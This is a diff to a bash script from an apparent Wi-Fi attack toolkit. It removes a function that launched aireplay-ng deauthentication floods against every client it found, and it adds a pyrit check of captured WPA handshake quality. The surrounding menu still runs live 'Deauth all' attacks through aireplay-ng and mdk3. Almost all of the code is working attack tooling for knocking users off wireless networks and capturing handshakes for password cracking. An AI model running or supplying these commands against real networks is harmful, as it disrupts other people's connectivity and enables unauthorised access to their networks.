@@ -25,52 +25,6 @@ printf '\033]2;DEAUTH MENU\a'
 REDEAUTH="n"
 WLANNM=$(cat /root/lscript/wlanmon.txt)
 export WLANNM
-function option4
-{
-	rm -f /root/lscript/deauthtemp.txt
-	while true
-	do
-		echo -e "Searching for clients(If it doesnt load in 1 sec, it won't.)"
-		dlines=$(cat $HANDFORDEAUTH | awk 'END{print NR}')
-		dlines=$((dlines-6))
-		clear
-		echo -e "Found $dlines clients."
-		if [[ "$dlines" -gt 0 ]]
-		then
-			n=0
-			while [ $n -lt $dlines ]
-			do
-			n=$((n+1))
-				n1=$((5+n))
-				MAC=$(cat $HANDFORDEAUTH | awk -v nn="$n1" '{FS=","}{if(NR==nn)print $1}')
-				if [[ "$MAC" = "" ]]
-				then
-					echo -e "Empty MAC.Skipping..."
-					continue
-				fi
-				if [[ -f /root/lscript/deauthtemp.txt ]]
-				then
-					CHECKMAC=$(cat /root/lscript/deauthtemp.txt | awk -v n2="$MAC" '{if($0 ~ n2)print}')
-					if [[ "$CHECKMAC" != "" ]]
-					then
-						echo -e "$MAC already being deauthed.Skipping..."
-						continue
-					fi
-				fi
-				echo $MAC >> /root/lscript/deauthtemp.txt
-				echo -e "Deauthing "$MAC"..."
-				export MAC
-				xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 0 -a $TARGB -c $MAC $WLANNM; exec bash' & disown
-			done
-		else
-			echo -e "No clients connected..."
-		fi
-		sleep 5
-		clear
-		break
-		#sleep 5
-	done
-}
 function option3
 {
 while true
@@ -155,13 +109,49 @@ do
 	fi
 done
 }
-
+function pyrit_hand_check
+{
+	clear
+	echo -e "Checking handshake with pyrit..."
+	TEMP=$(pyrit -r "$HANDCAP" analyze 2>/dev/null) 
+	TEMPHAND=$(echo "$TEMP" | grep "No valid EAOPL-handshake + ESSID detected.")
+	clear
+	if [[ "$TEMPHAND" = "" ]]
+	then
+		VALIDH=1
+		#TEMPHANDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "good")
+		TEMPHANDD=$(echo "$TEMP" | grep "good")
+		if [[ "$TEMPHANDD" = "" ]]
+		then
+			#TEMPHANDDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "bad")
+			TEMPHANDDD=$(echo $TEMP | grep "bad")
+			if [[ "TEMPHANDDD" = "" ]]
+			then
+				echo -e "Handshake found!(Status: "$RS"unknown"$CE")"
+			else
+				echo -e "Handshake found!(Status: "$RS"bad"$CE")"
+			fi
+			sleep 3
+		else
+			echo -e "Valid handshake found!(Status: "$YS"good"$CE")"
+			sleep 3
+		fi
+	else
+		VALIDH=0
+		echo -e ""$RS"No handshake found."$CE""
+		sleep 2
+	fi
+}
 while true
 do
 	clear
 	echo -e ""$YS" 1"$CE") Deauth all                      aireplay-ng"
 	echo -e ""$YS" 2"$CE") Deauth all                      mdk3"
 	echo -e ""$YS" 3"$CE") Deauth client/s                 aireplay-ng"
+	if [[ "$HANDF" != "deauth" ]]
+	then
+		echo -e ""$YS" 4"$CE") Check handshake quality"
+	fi
 	if [[ "$LASTOPTIONS" != "" ]]
 	then
 		echo -e ""$YS"ENTER"$CE") Last option"
@@ -180,6 +170,12 @@ do
 		export DEAUTHS
 		export TARGB
 		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash'
+	elif [[ "$DT" == 4 ]]
+	then
+		if [[ "$HANDF" != "deauth" ]]
+		then
+			pyrit_hand_check
+		fi
 	elif [[ "$DT" == "" ]]
 	then
 		if [[ "$HANDFORDEAUTH" != "" ]]
@@ -205,20 +201,6 @@ do
 	elif [[ "$DT" = 3 ]]
 	then
 		option3
-		#~ echo -e "Client's MAC: "
-		#~ read -e TCC
-		#~ echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
-		#~ read -e DEAUTHS
-		#~ clear
-		#~ if [[ -z "$DEAUTHS" ]]
-		#~ then
-			#~ DEAUTHS=0
-		#~ fi
-		#~ LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM"
-		#~ export DEAUTHS
-		#~ export TARGB
-		#~ export TCC
-		#~ xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
 	elif [[ "$DT" = 4 ]]
 	then
 		LASTOPTIONS=1
